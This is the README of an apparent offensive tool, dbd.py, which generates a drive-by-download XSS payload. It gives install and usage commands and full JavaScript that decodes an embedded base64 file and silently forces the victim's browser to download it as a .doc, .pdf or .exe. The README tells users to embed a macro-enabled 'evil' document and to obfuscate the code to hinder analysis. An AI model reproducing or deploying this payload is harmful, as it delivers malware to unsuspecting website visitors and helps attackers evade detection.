# dbd.py (drive-by-download)

Generate a post exploit script to download an arbitrary file using HTML5's Blob object (https://developer.mozilla.org/en-US/docs/Web/API/Blob). Say goodbye to ```alert(1)```.

# install

```shell
$ git clone https://github.com/demetriusford/drive-by-download
$ cd drive-by-download && pip3 install -r requirements/all.txt
```

# usage

```bash
Usage: dbd.py [OPTIONS]

  Generate a drive-by-download XSS payload.

Options:
  --version
  --extension [.doc|.pdf|.exe]
  --evil-file FILE
  --help                          Show this message and exit.
```

Create a macro-enabled document, then run:

```bash
$ python3 dbd.py --extension=".doc" \
                 --evil-file="/path/to/evil.doc"
```

You'll see the generated JavaScript printed to `stdout` with the embedded file contents. Now, you can spend time obfuscating identifier names, string extractions, and code operations to complicate analysis:
  
```javascript
const MIMES = {
  '.doc': 'application/msword'
  , '.pdf': 'application/pdf'
  , '.exe': 'application/octet-stream'
, };

class MimeFactory {
  constructor(type) {
    if (!(type in MIMES)) return;

    this.type = MIMES[type];
  }
}

((file, payload) => {
  const empty = ({
    length
  }) => length === 0;

  if (empty(file) || empty(payload)) return;

  const decoded = window.atob(payload);

  const mime = new MimeFactory(file);
  const size = payload.length;
  const link = document.createElement('a');

  const bin = new Uint8Array(size);
  for (let i = 0; i < size; i++) {
    bin[i] = decoded.charCodeAt(i);
  }

  const blob = new Blob([bin.buffer]
    , {
      type: mime.type
    });

  const url = window.URL.createObjectURL(blob);

  link.style = 'display:none;';
  link.href = url;
  link.download = file;

  document.body.appendChild(link);
  link.click();

  window.URL.revokeObjectURL(url);
  document.body.removeChild(link);

})('657hi94.doc', '...');
```
